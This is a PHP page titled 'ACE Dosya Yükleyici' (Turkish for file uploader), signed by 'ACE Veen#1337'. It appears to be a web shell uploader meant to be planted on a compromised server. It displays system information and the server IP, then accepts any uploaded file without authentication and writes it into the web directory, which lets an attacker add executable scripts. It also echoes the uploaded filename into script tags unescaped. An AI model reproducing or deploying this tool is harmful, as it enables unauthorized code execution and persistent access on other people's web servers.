<?php
// Coded By ACE
$server_info = php_uname();
$user_ip = $_SERVER['REMOTE_ADDR'];

if(isset($_FILES['file'])){
    $hedef_dizin = getcwd() . "/";
    $hedef_file = $hedef_dizin . basename($_FILES['file']['name']);
    
    if(move_uploaded_file($_FILES['file']['tmp_name'], $hedef_file)) {
        echo "<script>alert('Dosya yüklendi: "  . basename($_FILES['file']['name']) . "');</script>";
    } else {
        echo "<script>alert('Dosya yüklenemedi!: "  . basename($_FILES['file']['name']) . "');</script>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dosya Yükleme</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            color: #333;
            margin-top: 0;
        }
        .server-info {
            background-color: #f0f0f0;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        input[type="file"] {
            margin-bottom: 10px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 300px;
            box-sizing: border-box;
        }
        input[type="submit"],
        .green-button {
            padding: 10px 20px;
            border: none;
            background-color: #008CBA;
            color: white;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            width: 300px;
            box-sizing: border-box;
            text-decoration: none;
        }
        input[type="submit"]:hover,
        .green-button:hover {
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="server-info">
            <h2>Server Bilgisi</h2>
            <p><?php echo $server_info; ?></p>
            <p>Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></p>
            <p>Your IP: <a class="green-button" href="#" onclick="alert('Your IP: <?php echo $user_ip; ?>')">Görüntüle</a></p>
            <p>PHP Version: <?php echo phpversion(); ?></p>
            <p>Max Upload Size: <?php echo ini_get('upload_max_filesize'); ?></p>
        </div>
        <h2>ACE Dosya Yükleyici</h2>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Yükle">
        </form>
    </div>
</body>
</html>
<!-- Coded By ACE Veen#1337-->